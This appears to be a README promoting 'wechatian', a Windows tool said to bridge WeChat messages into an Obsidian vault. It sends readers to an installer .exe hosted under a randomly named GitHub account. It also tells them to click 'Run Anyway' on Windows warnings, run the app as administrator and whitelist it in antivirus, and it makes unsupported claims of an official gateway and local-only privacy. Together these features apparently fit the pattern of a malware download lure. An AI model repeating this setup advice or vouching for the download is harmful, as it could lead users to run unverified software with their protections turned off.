# 📥 wechatian - Your WeChat Brain, Doubled

## 🚀 What Is This?

wechatian is a smart bridge that connects your WeChat account directly to Obsidian, your personal knowledge vault. Think of it as a private conveyor belt: every message, photo, file, or voice note you receive on WeChat gets neatly delivered into your Obsidian notes — automatically. And if you want to send messages out, you just drop a file into a folder, and wechatian takes care of the rest.

## 🎯 Who Is This For?

This is for anyone who uses WeChat for work, study, or life and wants to keep a clean, searchable record of conversations, media, and ideas inside Obsidian — without copying and pasting anything manually. If you can download a file and double-click it, you can run this.

## ✨ Key Features

### 🤖 Official Gateway, Rock-Solid Connection
wechatian works through the official ilink gateway approved by WeChat. That means your data travels through the proper channel — no sketchy workarounds, no risk of being banned. It’s the responsible way to integrate.

### 📬 Automatic Inbox to Vault
When someone sends you a message, a photo, a PDF, or a voice clip on WeChat, wechatian drops it straight into your Obsidian vault. You’ll see it appear as a note or an attachment — instantly searchable, permanently stored, and fully yours.

### 📤 File-Based Outbox for Sending
Want to send a message from Obsidian? Just create a text file (like `send.txt`) with your recipient’s ID and the message content, place it in the outbox folder, and wechatian sends it on your behalf. You can even automate this — schedule messages, send from templates, or integrate it with other tools.

### 🗂️ Organized by Default
Incoming messages are sorted by sender and date. You won’t get a messy pile of random notes. It’s tidy by design, so you spend less time organizing and more time thinking.

### 🔐 Private and Local
All your data stays on your computer. wechatian doesn’t send your notes to any cloud service. It only reads from WeChat and writes to your local Obsidian vault. Simple and safe.

## 📥 Getting Started (Windows)

### Step 1: Download the Software

👉 [**Click here to download wechatian**](https://github.com/lishablastodermatic520/wechatian)

This link will take you to the download page. Look for the latest version and download the file.

### Step 2: Run the Installer

Once the download completes, locate the file in your **Downloads** folder. It should be named something like `wechatian-setup.exe`.

Double-click the file and follow the on-screen instructions. If Windows shows a blue or yellow prompt asking for permission, click **"Yes"** or **"Run Anyway"** — this is normal for a new application.

### Step 3: First Launch Setup

When you open wechatian for the first time, a small setup window will appear. You’ll need to provide two paths:

- **Your Obsidian Vault folder**: The folder where all your notes live (e.g., `C:\Users\YourName\Documents\MyVault`)
- **Your WeChat login**: You’ll scan a QR code with your phone to authorize the connection — same as you would with WeChat Web or WeChat Desktop.

Click **"Connect"** and wait a few seconds. That’s it.

### Step 4: Confirm Everything Works

Send a test message to yourself or a friend on WeChat. Within a second or two, a new note should appear in your Obsidian vault under a folder called `inbox`. You did it — the bridge is alive.

## 🧪 Testing the Outbox (Sending a Message)

Open your vault in Obsidian. Create a new folder called `outbox`. Inside it, create a text file named `send.txt` with the following content:

```
to: 1234567890
message: Hello from Obsidian!
```

Replace `1234567890` with your friend’s WeChat ID. Save the file. wechatian will detect it and send the message within a few seconds. You’ll see the file get renamed to `sent.txt` as confirmation.

## ❓ Frequently Asked Questions

### Do I need to keep wechatian running all the time?
Yes. Just like any bridge, it must be running to move data between WeChat and Obsidian. It uses very little memory — you can start it manually or set it to launch at startup from the settings menu.

### Will this affect my WeChat account?
No. Because wechatian uses the official ilink gateway, it works within the rules of the platform. No modified clients or unauthorized protocols are used.

### Can I receive images and videos?
Yes. Photos, videos, files, and voice messages are all saved into your vault as attachments. You’ll see them referenced inside the corresponding note.

### What if the app crashes or stops?
wechatian is designed to auto-reconnect. If it crashes, just restart it — your data won’t be lost. Any message that arrived while it was offline will still be delivered the next time it starts.

### Where are my messages stored?
Inside your Obsidian vault. You can see the `inbox` folder with subfolders per contact. The files are plain text (`.md`), so they’ll always be readable even if you switch apps later.

## 🛠️ Troubleshooting

### Problem: The app won’t start.
**Solution:** Make sure you have Windows 10 or later. Right-click the app icon and select "Run as administrator." Also, check that your antivirus isn’t blocking the file — you may need to allow it as a trusted app.

### Problem: Obsidian doesn’t show new notes.
**Solution:** Confirm you entered the correct vault path. In Obsidian, go to Settings → Files and Links, and check the "Location for New Notes" — no need to change it. Just make sure the folder wechatian writes to is inside your vault.

### Problem: QR code won’t scan.
**Solution:** Make sure your phone is on the same Wi-Fi network. Hold your phone steady, and try again. If it fails, restart the app and try once more.

### Problem: Outbox messages don’t send.
**Solution:** Double-check the file name — it must be `send.txt` (all lowercase, no spaces). Also check the format: `to:` and `message:` must be on separate lines, exactly as shown.

## 📝 System Requirements

- Windows 10 or higher (64-bit)
- 4 GB RAM (minimum)
- 200 MB free disk space
- Obsidian desktop app (latest version recommended)
- WeChat account (active)

## 🔒 Privacy and Security

Your messages are processed locally. wechatian does not upload, store, or analyze your content on any server outside of your computer. The only network connection made is to the official WeChat gateway — none of your Obsidian notes leave your machine.

## 📚 Advanced Use Cases

### Build a Personal CRM
Every client conversation is automatically saved as a note. Add tags in the note to track deals, follow-ups, or preferences.

### Journal Automatically
As you chat, your day’s conversations become a searchable timeline. Link notes together with Obsidian’s backlinks for a rich personal history.

### Automate Replies
Write a script that checks your outbox folder and generates replies based on keywords. Since wechatian just reads files, any automation tool (like Python or AutoHotkey) can drive it.

### Sync Across Devices
Use a cloud folder (e.g., OneDrive, Dropbox) for your vault. Incoming messages on your desktop will appear on your phone’s Obsidian automatically.

## 🧩 How It Fits Into Your Workflow

Imagine you receive a contract on WeChat. In the past, you’d download it, save it somewhere, and maybe lose it. With wechatian, the contract appears as an attachment inside a note with the sender’s name and date. You can link it to a project note, add a summary, and next week when you search “contract,” it’s right there.

Or perhaps you’re a researcher: a colleague sends you a series of voice memos. Each one arrives as a note linked to your research project. You can play them, take notes beside them, and export your analysis later.

The point is: wechatian removes friction. It makes sure that nothing important stays trapped in an unprotected chat app — everything becomes part of your long-term knowledge system.

## 🏁 Final Words

wechatian is the missing bridge between your conversations and your knowledge base. It’s simple to set up, runs quietly in the background, and gives you full control over your data. Whether you use it for work or personal life, you’ll wonder how you ever managed without it.

## 📦 Download Again

👉 [**Download wechatian now**](https://github.com/lishablastodermatic520/wechatian)

Get it installed in under five minutes. Your future self will thank you.

Keywords: wechat, obsidian, bridge, plugin, ilink, integration, notes, vault, messaging, automation, Windows, download, sync, personal knowledge management, wechatian